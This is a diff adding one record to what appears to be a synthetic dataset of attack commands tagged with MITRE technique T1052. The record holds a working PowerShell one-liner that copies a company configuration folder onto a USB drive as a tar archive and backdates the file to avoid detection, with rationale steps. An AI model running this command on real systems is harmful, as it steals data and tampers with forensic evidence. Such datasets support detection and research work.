@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $tar=Join-Path $usb 'svc.tar'; tar -cf $tar -C 'C:\\ProgramData' 'Company\\Configs'; (Get-Item $tar).LastWriteTime = (Get-Date '2018-01-01')",
+  "explanation": "Creates a tar archive directly on the USB and backdates its timestamp to blend with older files.",
+  "rationale_steps": [
+    "Locate removable drive",
+    "Archive target configuration data directly onto USB",
+    "Modify file timestamp to reduce detection"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-b8a5d20a",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
